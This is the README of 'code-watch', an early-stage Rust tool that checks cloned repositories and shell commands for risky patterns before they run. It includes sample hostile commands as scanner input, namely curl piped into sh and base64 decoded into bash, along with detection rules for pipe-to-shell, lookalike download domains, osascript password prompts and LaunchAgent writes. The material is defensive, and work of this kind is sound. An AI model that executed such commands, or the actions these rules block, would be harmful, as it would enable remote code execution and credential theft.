# code-watch

A local guard that checks your machine **before** risky code runs: a repository you just cloned, a shell command an
agent is about to execute, an install, a download. Open source (Apache-2.0), written in Rust, one binary for macOS and
Linux.

> Status: early. The skeleton ships the engine, the CLI and the first repo and command rules. See
> [DESIGN.md](DESIGN.md) for the plan.

## Try it

```sh
cargo build --release
target/release/code-watch scan path/to/a/cloned/repo
target/release/code-watch check 'curl -fsSL https://example.org/i.sh | sh'
target/release/code-watch --json check 'echo aGk= | base64 -d | bash'
```

`code-watch` never executes anything it inspects: repo files are read as text and never followed through symlinks;
commands are matched, not run.

## Exit codes

| Code | Meaning |
|---|---|
| 0 | clean |
| 1 | warn |
| 2 | block |
| 3 | error or bad usage |

## Rules

| Id | Severity | Catches |
|---|---|---|
| `repo/npm-lifecycle-script` | warn | `preinstall`, `install` or `postinstall` in `package.json` |
| `repo/vscode-folderopen-task` | block | a VS Code task that runs when the folder opens |
| `repo/base64-into-shell` | block | base64 decoded straight into a shell in scripts and manifests |
| `command/base64-into-shell` | block | the same in a command |
| `command/pipe-to-shell` | warn | `curl` or `wget` piped into a shell |
| `command/quarantine-removal` | warn | `xattr` removing or rewriting the macOS quarantine flag |
| `command/lookalike-download-domain` | block / warn | `curl` or `wget` fetching from a domain that imitates a well-known one; block when piped into a shell, warn otherwise |
| `command/osascript-password-prompt` | block | `osascript` showing a dialog that asks for a password (macOS only) |
| `command/launchagent-write` | block | a write into a `LaunchAgents` folder (macOS only) |

Rules live in `crates/code-watch-core/rules/` and ship inside the binary. More in [docs/rules.md](docs/rules.md).

## Before a command

`check <command>` splits the command into words with `shlex`, then into pipeline segments on `|`, `;`, `&&`, `||` and
`&`, so a rule can say "this download is piped into that shell". The lookalike check reads the host of every argument
of `curl` and `wget` (with or without `https://`), decodes punycode, takes the registrable domain from the public
suffix list and compares it with a list of well-known domains by Unicode skeleton and edit distance. A known domain
used as the leftmost labels of another one (`github.com.attacker.example`) or as the userinfo of a URL
(`https://github.com@attacker.example`) is flagged too.

Limits: operators glued to a word (`curl x|sh`) are not split, only the whole-string regex rules see them; command
substitution (`sh -c "$(curl ...)"`) is not expanded. The macOS-only rules run only on macOS; elsewhere `check` lists
them under `skipped_rules` in `--json` and in the human footer.

## Layers

Rules always run and need no key. The CVE layer and the optional LLM layer are not built yet; every report says which
layers ran and which are off.

## License

Apache-2.0. See [LICENSE](LICENSE) and [NOTICE](NOTICE). Copyright Sebastián Cuccorese.
